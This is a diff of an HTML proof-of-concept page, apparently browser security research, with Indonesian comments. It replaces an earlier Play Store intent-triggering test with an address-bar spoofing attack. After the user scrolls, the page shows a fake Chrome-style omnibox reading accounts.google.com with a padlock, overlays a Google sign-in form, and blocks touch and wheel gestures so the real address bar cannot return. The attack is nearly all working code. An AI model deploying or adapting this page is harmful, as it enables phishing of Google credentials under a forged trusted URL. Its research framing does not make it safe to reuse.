@@ -1,132 +1,265 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Play Store Intent PoC</title>
-  <style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Security Research Proof of Concept - Omnibox Lock & UI Spoofing</title>
+<style>
     :root {
-      --bg: #0f172a;
-      --card: #1e293b;
-      --accent: #10b981;
-      --accent-hover: #059669;
-      --text: #f8fafc;
-      --text-muted: #94a3b8;
+        --primary-color: #1a73e8;
+        --bg-color: #f8f9fa;
+        --text-color: #202124;
+    }
+
+    * {
+        box-sizing: border-box;
     }
 
     body {
-      font-family: system-ui, -apple-system, sans-serif;
-      background: var(--bg);
-      color: var(--text);
-      min-height: 100vh;
-      margin: 0;
-      display: grid;
-      place-content: center;
-      text-align: center;
-      padding: 20px;
+        margin: 0;
+        padding: 0;
+        height: 4000px; /* Cukup panjang untuk memicu auto-hide omnibox */
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        background-color: var(--bg-color);
+        color: var(--text-color);
     }
 
-    .wrapper {
-      background: var(--card);
-      padding: 35px 28px;
-      border-radius: 16px;
-      box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3);
-      max-width: 380px;
-      width: 100%;
-      border: 1px solid rgba(255, 255, 255, 0.05);
+    .instructions {
+        padding: 40px 20px;
+        text-align: center;
+        max-width: 600px;
+        margin: 0 auto;
     }
 
-    h2 {
-      margin-top: 0;
-      font-size: 1.3rem;
+    .instructions h1 {
+        font-size: 22px;
+        color: #d93025;
+        margin-bottom: 10px;
     }
 
-    p {
-      color: var(--text-muted);
-      font-size: 0.9rem;
-      line-height: 1.4;
-      margin-bottom: 24px;
+    .instructions p {
+        font-size: 15px;
+        color: #5f6368;
+        line-height: 1.5;
     }
 
-    .target-btn {
-      display: block;
-      width: 100%;
-      box-sizing: border-box;
-      padding: 16px;
-      background: var(--accent);
-      color: white;
-      text-decoration: none;
-      font-weight: 600;
-      font-size: 0.95rem;
-      border-radius: 10px;
-      transition: background 0.2s, transform 0.1s;
+    /* Fake Omnibox / Top Bar Overlay yang meniru struktur asli */
+    #fakeOmnibox {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 56px;
+        background: #ffffff;
+        display: none;
+        align-items: center;
+        justify-content: space-between;
+        padding: 0 16px;
+        z-index: 999999;
+        box-shadow: 0 2px 6px rgba(0,0,0,0.15);
+        border-bottom: 1px solid #dfe1e5;
     }
 
-    .target-btn:active {
-      background: var(--accent-hover);
-      transform: scale(0.98);
+    .fake-url-bar {
+        flex: 1;
+        background: #f1f3f4;
+        height: 36px;
+        border-radius: 18px;
+        display: flex;
+        align-items: center;
+        padding: 0 14px;
+        font-size: 14px;
+        color: #202124;
+        gap: 8px;
+        border: 1px solid transparent;
     }
 
-    .hud {
-      margin-top: 20px;
-      padding: 10px;
-      background: rgba(15, 23, 42, 0.6);
-      border-radius: 8px;
-      font-family: monospace;
-      font-size: 0.75rem;
-      color: #34d399;
-      border: 1px solid rgba(52, 211, 153, 0.1);
+    .fake-url-bar span {
+        overflow: hidden;
+        white-space: nowrap;
+        text-overflow: ellipsis;
     }
-  </style>
+
+    .lock-icon {
+        color: #137333;
+        font-size: 12px;
+    }
+
+    /* Halaman Login/Phishing Simulasi */
+    #secureView {
+        position: absolute;
+        left: 0;
+        width: 100%;
+        display: none;
+        padding-top: 80px;
+        background: #ffffff;
+        min-height: 100vh;
+        z-index: 99998;
+    }
+
+    .card {
+        width: 90%;
+        max-width: 400px;
+        margin: 40px auto;
+        padding: 24px;
+        background: white;
+        border-radius: 8px;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+        border: 1px solid #dadce0;
+        text-align: center;
+    }
+
+    .card h2 {
+        font-size: 20px;
+        margin-bottom: 20px;
+        color: #202124;
+    }
+
+    .input-field {
+        width: 100%;
+        padding: 12px 14px;
+        margin: 8px 0 16px 0;
+        border: 1px solid #dadce0;
+        border-radius: 4px;
+        font-size: 16px;
+        outline: none;
+    }
+
+    .input-field:focus {
+        border-color: var(--primary-color);
+        box-shadow: 0 0 0 2px rgba(26,115,232,0.2);
+    }
+
+    .btn-submit {
+        width: 100%;
+        padding: 12px;
+        background: var(--primary-color);
+        color: white;
+        border: none;
+        border-radius: 4px;
+        font-size: 16px;
+        font-weight: 500;
+        cursor: pointer;
+    }
+
+    .btn-submit:hover {
+        background: #1557b0;
+    }
+
+    #statusIndicator {
+        position: fixed;
+        bottom: 20px;
+        left: 50%;
+        transform: translateX(-50%);
+        background: rgba(0,0,0,0.8);
+        color: white;
+        padding: 8px 16px;
+        border-radius: 20px;
+        font-size: 12px;
+        z-index: 99999;
+        pointer-events: none;
+        transition: opacity 0.3s ease;
+    }
+</style>
 </head>
 <body>
 
-  <div class="wrapper">
-    <h2>Play Store Intent PoC</h2>
-    <p>Long-press target, select <b>Preview page</b>, and observe if Play Store triggers.</p>
-    
-    <a href="https://play.google.com" id="pocLink" class="target-btn">
-      Trigger Play Store Intent
-    </a>
+<div class="instructions" id="instructionBox">
+    <h1>Security Analysis Test</h1>
+    <p>1. Scroll down smoothly until the browser address bar automatically hides.<br>
+       2. Keep scrolling or stop briefly.<br>
+       3. The script will intercept gesture states and lock layout bounds.</p>
+</div>
 
-    <div class="hud" id="hudStatus">HUD: IDLE - Waiting for long-press</div>
-  </div>
+<!-- Fake Omnibox UI Spoofing Layer -->
+<div id="fakeOmnibox">
+    <div class="fake-url-bar">
+        <span class="lock-icon">🔒</span>
+        <span>https://accounts.google.com/signin/oauth</span>
+    </div>
+</div>
 
-  <script>
-    const link = document.getElementById("pocLink");
-    const hud = document.getElementById("hudStatus");
-    let state = 0;
+<!-- Fullscreen Intercept View -->
+<div id="secureView">
+    <div class="card">
+        <h2>Sign in to continue</h2>
+        <input type="text" class="input-field" placeholder="Email or phone" value="target_user@gmail.com">
+        <input type="password" class="input-field" placeholder="Enter your password" value="********">
+        <button class="btn-submit">Next</button>
+    </div>
+</div>
 
-    // Intent URI yang menargetkan Google Play Store (contoh: membuka halaman aplikasi WhatsApp atau aplikasi populer lain)
-    const playStoreIntent = "intent://details?id=com.whatsapp#Intent;scheme=market;package=com.android.vending;S.browser_fallback_url=https%3A%2F%2Fplay.google.com%2Fstore%2Fapps%2Fdetails%3Fid%3Dcom.whatsapp;end;";
+<div id="statusIndicator">Status: Waiting for scroll action...</div>
 
-    link.addEventListener("pointerdown", () => {
-      if (state === 0) {
-        state = 1;
-        hud.textContent = "HUD: Pointer down detected...";
-      }
-    }, { passive: true });
+<script>
+    let isLocked = false;
+    let scrollTriggered = false;
 
-    link.addEventListener("contextmenu", (e) => {
-      if (state === 2) return;
-      state = 2;
-      
-      hud.textContent = "HUD: Context menu captured. T-2500ms...";
-
-      setTimeout(() => {
-        hud.textContent = "HUD: Injecting Play Store Intent...";
-        
-        // Memaksa navigasi ke skema market/playstore dari background
-        window.location.href = playStoreIntent;
-
-        setTimeout(() => {
-          state = 0;
-          hud.textContent = "HUD: State reset. Ready again.";
-        }, 1200);
-
-      }, 2500);
+    // Deteksi aktivitas scroll awal untuk memastikan omnibox tersembunyi secara natural
+    window.addEventListener('scroll', function() {
+        if (window.scrollY > 150 && !scrollTriggered) {
+            scrollTriggered = true;
+            document.getElementById('statusIndicator').innerText = "Status: Scroll detected. Preparing lock sequence...";
+            
+            // Timeout untuk mengaktifkan penguncian setelah 5 detik atau saat posisi pas
+            setTimeout(activateSpoofingLock, 4000);
+        }
     });
-  </script>
+
+    function activateSpoofingLock() {
+        isLocked = true;
+        
+        let currentY = window.scrollY;
+        let secureView = document.getElementById("secureView");
+        let fakeOmnibox = document.getElementById("fakeOmnibox");
+        let indicator = document.getElementById("statusIndicator");
+        let instructions = document.getElementById("instructionBox");
+
+        // Sembunyikan instruksi asli
+        instructions.style.display = 'none';
+
+        // Set posisi konten persis di viewport saat ini untuk mencegah loncatan layout (layout shift)
+        secureView.style.top = currentY + "px";
+        secureView.style.display = "block";
+        fakeOmnibox.style.display = "flex";
+
+        indicator.innerText = "Status: UI Lock & Omnibox Spoof Active!";
+        indicator.style.background = "#d93025";
+
+        // Mencegah scroll ulang ke atas yang biasanya memicu kemunculan omnibox asli
+        window.scrollTo({
+            top: currentY,
+            behavior: 'instant'
+        });
+    }
+
+    // Penanganan ketat event sentuh untuk memblokir gestur tarik ke bawah (Pull-to-refresh / Show Omnibox)
+    let startY = 0;
+
+    document.addEventListener("touchstart", function(e) {
+        startY = e.touches[0].clientY;
+    }, { passive: false });
+
+    document.addEventListener("touchmove", function(e) {
+        if (!isLocked) return;
+
+        let currentY = e.touches[0].clientY;
+        let deltaY = currentY - startY;
+
+        // Jika pengguna mencoba menarik layar ke bawah untuk memunculkan bilah alamat asli
+        if (deltaY > 0) {
+            e.preventDefault(); // Blokir pemulihan UI browser
+        }
+    }, { passive: false });
+
+    // Blokir event roda mouse / trackpad jika diuji pada mode emulation desktop
+    document.addEventListener("wheel", function(e) {
+        if (!isLocked) return;
+        if (e.deltaY < 0) {
+            e.preventDefault();
+        }
+    }, { passive: false });
+</script>
 
 </body>
 </html>
